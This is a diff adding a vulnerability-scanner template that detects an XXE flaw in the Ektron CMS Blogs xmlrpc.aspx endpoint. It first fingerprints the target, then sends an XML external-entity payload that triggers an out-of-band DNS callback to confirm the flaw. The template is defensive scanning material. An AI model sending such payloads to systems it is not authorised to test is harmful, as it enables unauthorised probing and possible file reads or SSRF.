@@ -1,0 +1,51 @@
+id: ektron-cms-blogs-xmlrpc-aspx-xxe
+
+info:
+    name: Ektron CMS Blogs xmlrpc.aspx XML外部实体注入漏洞
+    author: pussycat0x
+    severity: high
+    description: |
+      检测 Ektron CMS Blogs 组件中的 XML 外部实体（XXE）漏洞，该漏洞位于 /WorkArea/Blogs/xmlrpc.aspx。未认证攻击者可利用此漏洞读取本地文件或发起 SSRF 攻击。
+      参考链接：
+    reference:
+        - https://www.exploit-db.com/exploits/21085
+        - https://packetstormsecurity.com/files/116259/Ektron-CMS-8.5.0-File-Upload-XXE-Injection.html
+        - https://www.acunetix.com/vulnerabilities/web/ektron-cms-multiple-vulnerabilities
+    classification:
+        cwe-id: CWE-611,CWE-918
+    metadata:
+        verified: false
+        max-request: 2
+        shodan-query: http.html:"EktronClientManager"
+        create-at: "2026-07-17"
+        update-at: "2026-08-13"
+    tags: Ektron-CMS
+
+flow: http(1) && http(2)
+
+http:
+    - raw:
+        - |
+          GET / HTTP/1.1
+          Host: {{Hostname}}
+      matchers:
+        - type: dsl
+          dsl:
+            - 'status_code == 200'
+            - 'contains(body, "EktronClientManager")'
+          condition: and
+          internal: true
+    - raw:
+        - |
+          POST /WorkArea/Blogs/xmlrpc.aspx HTTP/1.1
+          Host: {{Hostname}}
+
+          <!DOCTYPE scan [<!ENTITY test SYSTEM "http://{{interactsh-url}}">]>
+          <scan>&test;</scan>
+      matchers:
+        - type: dsl
+          dsl:
+            - contains(interactsh_protocol, "dns")
+            - status_code == 200 || status_code == 500
+          condition: and
+          # digest: 4a0a00473045022100a56d2d8bb1fb1c11f8730497a5a45e13c763401acbc94b2f5ec746bc7d2241c3022072de8758bc5360ac317ee2305995188bf522327003efaeb9667d875e005cb0fe:922c64590222798bb761d5b6d8e72950
